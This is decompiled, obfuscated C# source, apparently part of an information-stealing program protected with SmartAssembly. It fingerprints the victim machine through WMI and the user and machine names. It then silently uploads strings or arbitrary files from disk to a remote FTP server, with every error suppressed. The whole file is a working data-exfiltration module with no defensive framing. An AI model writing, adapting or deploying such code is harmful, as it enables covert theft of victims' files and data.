using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace KNpKkassJHAdE;

internal sealed class KmMaNbsldEJY
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string ftqLxZfYrLhH()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107364984));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107364995)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107364946);
			ManagementObject val3 = new ManagementObject(getString_0(107364973) + text2 + getString_0(107364932));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107364895)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107352657) : text;
		}
	}

	public static void tJqDJjDFLgaLvJg(string RLGFPDxMikAUy = "URL", string eyNqowRvlEOvIU = "USERNAME", string kJpuuPEvuzVVR = "ACCESO", string KluPvszqArUEo = "")
	{
		try
		{
			string text = ftqLxZfYrLhH();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(RLGFPDxMikAUy + getString_0(107365610) + Environment.UserName + getString_0(107365565) + Environment.MachineName + getString_0(107365576) + text + getString_0(107365571));
			ftpWebRequest.Method = getString_0(107364902);
			ftpWebRequest.Credentials = new NetworkCredential(eyNqowRvlEOvIU, kJpuuPEvuzVVR);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(KluPvszqArUEo);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void uWayiSxqXzMe(string mNZZgGNcMngdMUfa = "URL", string ELnCAgyLSedJla = "USERNAME", string YzTkuYiRzFJF = "ACCESO", string rXGrFTnncne = "")
	{
		try
		{
			string text = ftqLxZfYrLhH();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(mNZZgGNcMngdMUfa + getString_0(107365610) + Environment.UserName + getString_0(107365565) + Environment.MachineName + getString_0(107365576) + text + getString_0(107365576) + Path.GetFileName(rXGrFTnncne));
			ftpWebRequest.Method = getString_0(107364902);
			ftpWebRequest.Credentials = new NetworkCredential(ELnCAgyLSedJla, YzTkuYiRzFJF);
			byte[] array = File.ReadAllBytes(rXGrFTnncne);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static KmMaNbsldEJY()
	{
		Strings.CreateGetStringDelegate(typeof(KmMaNbsldEJY));
	}
}
